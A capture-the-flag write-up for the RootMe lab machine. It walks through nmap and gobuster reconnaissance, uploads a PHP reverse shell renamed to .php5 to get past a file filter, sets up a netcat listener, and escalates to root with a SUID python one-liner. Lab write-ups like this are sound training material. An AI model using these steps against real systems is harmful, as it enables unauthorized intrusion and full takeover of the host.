# RootMe writeup

## Task 2 - Reconnaissance

First, we try to ping the machine. 

<code>

    PING 10.10.125.204 (10.10.125.204) 56(84) bytes of data.
    64 bytes from 10.10.125.204: icmp_seq=41 ttl=63 time=73.7 ms
</code>

From the ttl value, we can deduce that is a Linux machine (for Windows it's ttl=127). 

Now, to find the services exposed by the machine and the open ports, we can use a **nmap** scan: 

``nmap -sV -sC -oA nmap/initial 10.10.125.204``

As result we obtain: 

<code>

    Nmap scan report for 10.10.125.204
    Host is up (0.086s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
    |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
    |_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-title: HackIT - Home
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code>

So, there is an Apache 2.4.29 server on port 80, and also ssh running on port 22. 

We can visit the web page: 

![web page](/RootMe/site.png)

As we can see, also inspecting the page, there's nothing useful (for now). 

We can scan hidden directory using **gobuster**: 

``gobuster dir -w /home/kali/SecLists-master/Discovery/Web-Content/common.txt -u http://10.10.125.204 -o gobusterCommonRoot.txt``

As result we obtain: 

![gobuster](/RootMe/gobuster.png)

The most interesting directory is */panel* and let's go visit it: 

![panel](/RootMe/panel.png)


## Task 3 - Gettin a shell

In the previous */panel* page, we are able to upload our files. So why not upload a web shell and then get a reverse shell?

If you are using Kali distribution, you can directly uoload ``/usr/share/webshells/php/php-reverse-shell.php`` file, changing the ip variable with your own ip. 

Unfortunately, there appears to be a filter on php file. 

![phpFilter](/RootMe/shell.png)

So, I try to change the file extension to *.php5*.
To obtain a reverse shell on our machine, we have to listen using netcat on port 1234 as follow: 

``nc -nlvp 1234``

The upload was successfull: 

![php5](/RootMe/shellPhp5.png)

Browsing to ``http://10.10.125.204/uploads/php-reverse-shell.php5`` we obtain our shell:

![reverse](/RootMe/reverse.png)

Let's cat user.txt flag

![flag](/RootMe/flag.png)


## Task 4 - Privilege escalation

Using ``find / -user root -perm /4000`` command, you can find files with SUID permission. To become root, we're going to use **/usr/bin/python**. 

A useful site is https://gtfobins.github.io/gtfobins/python/ that explains us how to exploit the suid above.

According to *gtfobins* we run

``python -c 'import os; os.execl("/bin/sh", "sh", "-p")'``

and now we are root of the system. So, we can cat root.txt flag. 



